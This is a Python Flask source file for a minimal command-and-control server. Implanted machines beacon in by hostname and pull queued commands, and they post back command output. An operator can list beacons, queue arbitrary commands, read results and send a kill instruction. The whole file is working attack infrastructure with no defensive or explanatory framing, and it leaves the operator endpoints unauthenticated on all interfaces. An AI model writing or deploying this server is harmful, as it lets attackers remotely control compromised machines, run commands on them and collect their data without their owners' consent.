import json
import time
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)
beacons = {}
commands = {}
results = {}

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    implant_id = data.get('hostname', 'unknown')
    beacons[implant_id] = {
        'last_seen': time.time(),
        'info': data,
        'commands': commands.get(implant_id, [])
    }
    if commands.get(implant_id):
        return jsonify({'command': commands[implant_id].pop(0)})
    return jsonify({'command': None})

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    implant_id = data.get('hostname', 'unknown')
    if implant_id not in results:
        results[implant_id] = []
    results[implant_id].append(data.get('output', ''))
    return jsonify({'status': 'ok'})

@app.route('/command/<implant_id>', methods=['POST'])
def send_command(implant_id):
    cmd = request.json.get('command')
    if implant_id not in commands:
        commands[implant_id] = []
    commands[implant_id].append(cmd)
    return jsonify({'status': 'queued'})

@app.route('/beacons', methods=['GET'])
def list_beacons():
    return jsonify(beacons)

@app.route('/results/<implant_id>', methods=['GET'])
def get_results(implant_id):
    return jsonify(results.get(implant_id, []))

@app.route('/kill/<implant_id>', methods=['POST'])
def kill_implant(implant_id):
    commands[implant_id] = ['exit']
    return jsonify({'status': 'kill_sent'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
